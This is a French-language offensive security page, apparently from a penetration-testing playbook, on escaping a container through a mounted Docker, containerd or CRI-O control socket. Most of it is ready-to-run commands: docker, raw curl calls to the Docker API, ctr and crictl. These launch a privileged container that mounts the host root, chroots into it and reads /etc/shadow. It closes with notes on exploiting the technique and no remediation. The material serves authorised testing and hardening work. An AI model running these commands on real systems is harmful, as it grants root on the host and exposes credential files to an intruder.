---
title: "Montage de socket de runtime : contrôler le démon hôte via un socket de conteneur monté"
order: 2
description: "Un conteneur dont le socket de contrôle Docker, containerd ou CRI-O est monté en bind dialogue directement avec le démon de conteneurs de l'hôte. Via cette API, un attaquant lance un nouveau conteneur entièrement privilégié qui monte en bind la racine de l'hôte, obtenant l'exécution de code root sur l'hôte. Illustré avec la CLI Docker, l'API HTTP brute de Docker sur le socket, containerd ctr et CRI-O crictl."
keywords:
  - docker.sock
  - containerd socket
  - crictl
  - évasion de conteneur
  - conteneur privilégié
---

# Montage de socket de runtime

Monter le socket de contrôle d'un runtime de conteneurs dans une charge de travail est l'une des mauvaises configurations les plus dangereuses, car ce socket est le plan de contrôle complet du démon sans authentification supplémentaire. Un processus capable d'écrire dans `/var/run/docker.sock` peut ordonner au démon Docker de l'hôte de démarrer n'importe quel conteneur de son choix, y compris un conteneur `--privileged` qui monte en bind le système de fichiers racine de l'hôte. Le nouveau conteneur s'exécute sur l'hôte en tant que root, de sorte que l'attaquant lit et écrit chaque fichier de l'hôte. Il en va de même pour les sockets containerd et CRI-O avec leurs propres clients.

Confirmez que le socket est présent et accessible :

```bash
ls -l /var/run/docker.sock /run/containerd/containerd.sock /run/crio/crio.sock 2>/dev/null
# probe the Docker API directly, no docker CLI required
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/info | head
```

## Voie : socket Docker

Si la CLI `docker` est présente dans l'image, une seule commande suffit :

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --privileged --rm -it alpine \
  chroot /host sh
```

Si aucune CLI n'est présente, pilotez l'API HTTP brute sur le socket avec `curl`. Créez un conteneur qui monte en bind la racine de l'hôte et qui est privilégié, démarrez-le, et lisez sa sortie :

```bash
# 1. Create the container (HostConfig.Binds mounts host / into /host; Privileged on)
cid=$(curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow; chroot /host sh -c id"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create | sed 's/.*"Id":"\([^"]*\)".*/\1/')

# 2. Start it, then stream the logs
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$cid/start
curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/containers/$cid/logs?stdout=1&stderr=1"
```

Pour un point d'ancrage interactif, créez plutôt le conteneur avec `"OpenStdin":true,"Tty":true`, puis attachez-vous à `/containers/$cid/attach?stream=1&stdin=1&stdout=1`. Si l'image cible n'est pas déjà présente, l'API `POST /images/create?fromImage=alpine` la télécharge d'abord, ou réutilisez une image que `GET /images/json` indique comme déjà disponible.

## Voie : socket containerd

Le socket de containerd se pilote avec `ctr`. Les conteneurs gérés par Kubernetes vivent dans l'espace de noms `k8s.io`, ciblez donc cet espace de noms :

```bash
ctr --address /run/containerd/containerd.sock namespace ls
ctr --address /run/containerd/containerd.sock -n k8s.io image ls | head
ctr --address /run/containerd/containerd.sock -n k8s.io run --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest esc chroot /host sh
```

## Voie : socket CRI-O ou CRI

Un socket CRI (`crio.sock`, ou un `cri.sock` générique) se pilote avec `crictl`. Définissez un pod et un conteneur privilégiés qui montent la racine de l'hôte :

```bash
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/crio/crio.sock
# pod and container JSON specify privileged:true and a host / bind mount, then:
pod=$(crictl runp pod.json)
cid=$(crictl create $pod container.json pod.json)
crictl start $cid && crictl exec -it $cid chroot /host sh
```

## Notes d'exploitation

- Le socket n'est pas authentifié : quiconque peut y écrire a le contrôle complet du démon, de sorte que l'appartenance à un groupe ou le mode de fichier du socket à l'intérieur du conteneur est le seul garde-fou. `ls -l` sur le socket indique si votre UID peut y écrire.
- Lancer un nouveau conteneur privilégié est plus propre que d'essayer de s'évader du conteneur actuel : le nouveau conteneur est root sur l'hôte par construction, indépendamment des capacités et du seccomp du conteneur actuel.
- Les voies containerd et CRI comptent dans Kubernetes, où le socket du nœud est parfois monté dans une charge de travail ; combinez avec [évasion de pod vers nœud Kubernetes](../../orchestration/kubernetes/pod-escape-to-node/index.md).
- Pour éviter de télécharger une image, réutilisez-en une déjà présente sur l'hôte (`/images/json`, `ctr image ls`, `crictl images`) ; n'importe quelle image Linux convient puisque vous effectuez immédiatement un `chroot` de la racine de l'hôte.

## Références

- [Référence de l'API Docker Engine](https://docs.docker.com/reference/api/engine/)
- [Utilisation de containerd ctr](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [HackTricks : Docker socket escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape)
